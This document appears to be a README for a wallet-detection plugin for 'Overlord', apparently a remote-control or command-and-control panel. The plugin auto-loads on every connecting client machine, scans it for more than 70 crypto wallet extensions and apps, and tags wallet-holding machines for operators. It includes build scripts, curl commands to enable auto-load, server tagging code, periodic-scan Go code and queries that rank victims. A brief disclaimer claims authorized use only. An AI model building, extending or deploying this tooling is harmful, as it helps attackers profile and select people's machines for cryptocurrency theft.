# 🎯 Crypto Wallet Detection Plugin - Complete Package

## 📦 What's Included

```
plugin-wallet-detect/
├── native/                          # Go plugin source code
│   ├── main.go                     # Core detection logic
│   ├── exports_unix.go             # Linux/macOS/BSD exports
│   ├── exports_windows.go          # Windows DLL exports
│   └── go.mod                      # Go module definition
│
├── wallet-detect.html              # Web UI interface
├── wallet-detect.css               # UI styling
├── wallet-detect.js                # UI JavaScript
│
├── build-plugin.bat                # Windows build script
├── build-plugin.sh                 # Linux/macOS build script
│
├── README.md                       # Plugin documentation
├── DEPLOYMENT_GUIDE.md            # Complete setup guide
└── SERVER_INTEGRATION.ts           # Server-side code example
```

## 🚀 Quick Start (30 Seconds)

### 1. Build
```bash
cd plugin-wallet-detect
./build-plugin.sh              # Linux/macOS
# OR
build-plugin.bat               # Windows
```

### 2. Upload
- Go to `https://your-overlord:5173/plugins`
- Upload `wallet-detect.zip`

### 3. Enable Auto-Load
```bash
curl -X POST https://your-overlord/api/plugins/wallet-detect/autoload \
  -H "Content-Type: application/json" \
  -d '{"autoLoad": true}'
```

### 4. Done!
Every client that connects will now be automatically scanned for crypto wallets.

## 🎯 Features

✅ **Auto-Detection** - Scans on every client connection  
✅ **70+ Wallets** - MetaMask, Phantom, Binance, Exodus, Electrum, Trust Wallet, and many more  
✅ **Cross-Platform** - Windows, Linux, macOS support  
✅ **Auto-Tagging** - Adds "crypto" tag to clients in web panel  
✅ **Web UI** - View detailed results per client  
✅ **Zero Config** - Works out of the box  

## 📊 Detected Wallets

### Browser Extensions (40+)
- 🦊 MetaMask
- 👻 Phantom
- 🟡 Binance Wallet
- 🔵 Coinbase Wallet
- 🛡️ Trust Wallet
- 🦁 Brave Wallet
- 🚀 Exodus
- 🐰 Rabby
- ⭕ OKX Wallet
- 🔢 Math Wallet
- 💳 Crypto.com
- ⚔️ Ronin Wallet
- 🔺 TronLink
- 🔐 SafePal
- 🪙 TokenPocket
- 🌌 Keplr
- ☀️ Solflare
- 💯 Coin98
- And 22 more...

### Desktop Applications (30+)
- 🚀 Exodus Desktop
- ⚡ Electrum
- ⚛️ Atomic Wallet
- ₿ Bitcoin Core
- Ξ Ethereum Wallet
- Ɱ Monero GUI
- 🔐 Ledger Live
- 🔒 Trezor Suite
- 🟡 Binance Desktop
- 🛡️ Trust Wallet
- 💎 Jaxx Liberty
- 🥷 Wasabi Wallet
- 🏛️ Daedalus
- 🌸 Yoroi
- 🐦 Sparrow Wallet
- 💙 BlueWallet
- And 14 more...

## 💡 How It Works

1. **Client connects** → Plugin auto-loads
2. **Plugin scans** → Checks filesystem for wallet paths
3. **Results sent** → Server receives wallet list
4. **Tags updated** → "crypto" tag appears in web panel
5. **UI updates** → Tag visible to operators

## 📝 Server Integration

Add this to your Overlord server plugin handler:

```typescript
if (pluginId === 'wallet-detect' && event === 'scan_complete') {
  const report = payload as { summary: string, wallets: Array<any> };
  
  if (report.summary !== 'none') {
    // Update client tags
    client.tags = { ...client.tags, crypto: report.summary };
    
    // Save to DB
    await db.run(
      'UPDATE clients SET tags = ? WHERE id = ?',
      [JSON.stringify(client.tags), clientId]
    );
  }
}
```

Complete integration code in `SERVER_INTEGRATION.ts`

## 🎨 UI Integration

Display the crypto tag in your client list:

```html
{#if client.tags?.crypto}
  <span class="badge badge-crypto">
    💰 {client.tags.crypto.split(',').length} wallet(s)
  </span>
{/if}
```

```css
.badge-crypto {
  background: #f59e0b;
  color: white;
  padding: 4px 8px;
  border-radius: 4px;
  font-weight: 600;
}
```

## 🔧 Configuration

### Enable Auto-Load (Required)

The plugin must be set to auto-load to scan every connecting client:

**Via API:**
```bash
curl -X POST http://localhost:5173/api/plugins/wallet-detect/autoload \
  -H "Content-Type: application/json" \
  -d '{"autoLoad": true}'
```

**Via Web UI:**
1. Navigate to `/plugins`
2. Find "wallet-detect"
3. Toggle "Auto-Load" to ON

### Continuous Scanning (Optional)

By default, scans once on load. For periodic scanning, edit `native/main.go`:

```go
func handleInit(hostJSON []byte) error {
  // Initial scan
  go detectWallets()
  
  // Scan every 5 minutes
  go func() {
    ticker := time.NewTicker(5 * time.Minute)
    for range ticker.C {
      detectWallets()
    }
  }()
  
  return nil
}
```

## 🐛 Troubleshooting

### Plugin Not Loading
Check server logs:
```bash
docker logs overlord-server -f | grep wallet-detect
```

Look for:
```
[plugins] Loading wallet-detect for client abc123
[wallet-detect] init: clientId=abc123 os=windows arch=amd64
[wallet-detect] scan complete: found 3 wallets
```

### No Wallets Detected
- Plugin only detects **installed** wallets (folder exists)
- Browser extensions must be in **default profile**
- Desktop apps must use **standard paths**

### Tags Not Showing
1. Verify server integration code is added
2. Check database has `tags` column
3. Confirm WebSocket broadcasts are working

## 📚 Documentation

- **README.md** - Plugin overview and features
- **DEPLOYMENT_GUIDE.md** - Complete setup walkthrough
- **SERVER_INTEGRATION.ts** - Server-side code examples

## 🔒 Security & Ethics

### What This Does:
✅ Detects wallet installation (folder exists)  
✅ Reports wallet type (MetaMask, etc.)  
✅ Reports installation path  

### What This Does NOT Do:
❌ Access wallet files or databases  
❌ Extract keys, seeds, or passwords  
❌ Read balances or transactions  
❌ Modify or steal wallet data  

**⚠️ Use Responsibly:**
- Only deploy on systems you own or have authorization to monitor
- Follow all applicable laws and regulations
- Inform users about system monitoring

## 📈 Analytics Example

View crypto wallet statistics:

```bash
# Count clients with wallets
curl -s http://localhost:5173/api/clients | jq '[.[] | select(.tags.crypto)] | length'

# Most common wallets
curl -s http://localhost:5173/api/clients | \
  jq -r '.[] | select(.tags.crypto) | .tags.crypto' | \
  tr ',' '\n' | sort | uniq -c | sort -rn
```

## 🎯 Build Targets

Default builds include:
- ✅ `windows-amd64` (Windows 64-bit)
- ✅ `windows-386` (Windows 32-bit)
- ✅ `linux-amd64` (Linux 64-bit)
- ✅ `linux-arm64` (Linux ARM64)
- ✅ `darwin-arm64` (macOS Apple Silicon)
- ✅ `darwin-amd64` (macOS Intel)

Custom build:
```bash
BUILD_TARGETS="windows-amd64 linux-amd64" ./build-plugin.sh
```

## ✅ Deployment Checklist

Before going live:

- [ ] Plugin built (`wallet-detect.zip` exists)
- [ ] Uploaded to Overlord server
- [ ] Auto-load enabled
- [ ] Server integration code added
- [ ] Server restarted (if needed)
- [ ] Test client connected and scanned
- [ ] Tags visible in web panel
- [ ] Plugin UI accessible
- [ ] Logs show successful scans

## 🎉 Success Indicators

You'll know it's working when:
1. ✅ Client connects to Overlord
2. ✅ Server logs show: `[wallet-detect] scan complete: found X wallets`
3. ✅ Client page shows "crypto" tag with wallet names
4. ✅ Plugin UI at `/plugins/wallet-detect?clientId=...` displays results

## 💬 Example Output

**Server Logs:**
```
[plugins] Auto-loading wallet-detect for client abc123
[wallet-detect] init: clientId=abc123 os=windows arch=amd64
[wallet-detect] starting wallet scan on windows
[wallet-detect] scan complete: found 3 wallets
[wallet-detect] Client abc123 scan complete
[wallet-detect] Summary: MetaMask,Phantom,Exodus
[wallet-detect] Found 3 wallet(s):
  - MetaMask: C:\Users\...\Chrome\...\nkbihfbeogaeaoehlefnkodbefgpgknn
  - Phantom: C:\Users\...\Chrome\...\bfnaelmomeimhlpmgjnjophhpkkoljpa
  - Exodus: C:\Users\...\AppData\Roaming\Exodus
[wallet-detect] Tagged client abc123 with: MetaMask,Phantom,Exodus
```

**Web Panel:**
```
Client: abc123
OS: Windows 10
Arch: amd64
Tags: [crypto: MetaMask,Phantom,Exodus] [windows] [x64]
```

## 🚀 Next Steps

1. **Build** the plugin with `./build-plugin.sh`
2. **Upload** `wallet-detect.zip` to your Overlord server
3. **Enable** auto-load in plugin settings
4. **Integrate** server-side event handler (see `SERVER_INTEGRATION.ts`)
5. **Test** with a client connection
6. **Monitor** results in web panel

## 📞 Need Help?

Check these files:
- **README.md** - Feature overview
- **DEPLOYMENT_GUIDE.md** - Step-by-step setup
- **SERVER_INTEGRATION.ts** - Code examples

---

**Ready to deploy?** Run `./build-plugin.sh` and you're 30 seconds away from crypto wallet detection! 🎯
